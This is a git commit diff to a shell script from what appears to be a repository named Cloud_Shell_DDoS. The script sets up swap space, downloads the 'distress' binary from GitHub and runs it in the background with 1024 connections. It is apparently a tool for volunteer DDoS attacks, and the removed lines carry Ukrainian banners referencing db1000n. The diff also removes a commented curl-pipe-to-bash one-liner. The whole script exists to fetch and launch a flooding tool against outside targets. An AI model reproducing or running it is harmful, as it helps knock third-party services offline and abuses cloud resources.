c7181839a17cbbd3b80c59ba023215b7467d470d
patatakartata <106821289+patatakartata@users.noreply.github.com>
2022-06-27 15:49:42 +0300

    Update sprintbox.sh

--- sprintbox.ru/sprintbox.sh
+++ sprintbox.ru/sprintbox.sh
@@ -1,5 +1,4 @@
 #!/bin/bash
-#curl -L https://raw.githubusercontent.com/patatakartata/Cloud_Shell_DDoS/main/sprintbox.ru/sprintbox.sh | bash
 
 fallocate -l 2G /swapfile
 chmod 600 /swapfile
@@ -9,12 +8,12 @@ swapon --show
 apt-get update > /dev/null 2>&1
 apt-get install --upgrade git ethstats tcpdump wget -y > /dev/null 2>&1
 cd
-
 wget https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl
 chmod +x distress_x86_64-unknown-linux-musl
+./distress_x86_64-unknown-linux-musl -c 1024 > sd 2>&1 &
 
-tput setaf 3; tput bold; echo "Death by 1000 needles successfully installed."
-echo -e "\033[1;44m     Україна вітає тебе друже!     \033[0m" 
-echo -e "\033[1;43m    Давай зробимо добру справу!    \033[0m" 
-tput setaf 6; tput bold; echo "Ініціюю  запуск  програми  db1000n" 
-sleep 6; ./distress_x86_64-unknown-linux-musl -c 1024 > sd 2>&1 &
+#tput setaf 3; tput bold; echo "Death by 1000 needles successfully installed."
+#echo -e "\033[1;44m     Україна вітає тебе друже!     \033[0m" 
+#echo -e "\033[1;43m    Давай зробимо добру справу!    \033[0m" 
+#tput setaf 6; tput bold; echo "Ініціюю  запуск  програми  db1000n" 
+#sleep 6; ./distress_x86_64-unknown-linux-musl -c 1024 > sd 2>&1 &
